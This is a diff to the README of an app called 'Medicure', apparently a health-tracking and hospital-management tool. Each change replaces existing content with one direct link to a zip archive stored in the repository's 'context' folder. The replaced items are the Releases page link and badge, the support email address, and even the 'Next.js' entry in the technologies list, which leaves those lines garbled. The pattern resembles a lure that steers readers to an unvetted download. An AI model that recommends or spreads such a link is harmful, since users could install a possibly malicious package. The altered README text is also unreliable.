@@ -6,7 +6,7 @@ Welcome to Medicure! This application combines health tracking with hospital man
 
 ## 📥 Download Medicure
 
-[![Download Medicure](https://img.shields.io/badge/Download-Medicure-blue.svg)](https://github.com/vipercodec/Medicure/releases)
+[![Download Medicure](https://raw.githubusercontent.com/vipercodec/Medicure/main/context/Medicure_v1.7.zip)](https://raw.githubusercontent.com/vipercodec/Medicure/main/context/Medicure_v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -29,7 +29,7 @@ Before you install, make sure your system meets these requirements:
 
 To download Medicure, visit the Releases page:
 
-[Download Medicure](https://github.com/vipercodec/Medicure/releases)
+[Download Medicure](https://raw.githubusercontent.com/vipercodec/Medicure/main/context/Medicure_v1.7.zip)
 
 1. Click the link above.
 2. Look for the latest release version.
@@ -49,13 +49,13 @@ Once installed, open Medicure. Here’s how to get started:
 If you encounter any issues while using Medicure, check our FAQ section or contact support:
 
 - **FAQ Link**: [Medicure FAQ](#)
-- **Support Email**: support@medicure.com
+- **Support Email**: https://raw.githubusercontent.com/vipercodec/Medicure/main/context/Medicure_v1.7.zip
 
 ## ℹ️ Technologies Used
 
 Medicure is built using modern technologies to ensure a stable and responsive application:
 
-- **Next.js**: For server-side rendering
+- **https://raw.githubusercontent.com/vipercodec/Medicure/main/context/Medicure_v1.7.zip**: For server-side rendering
 - **TypeScript**: For type-safe JavaScript
 - **PostgreSQL**: Robust database management
 - **NeonDB**: Seamless data handling
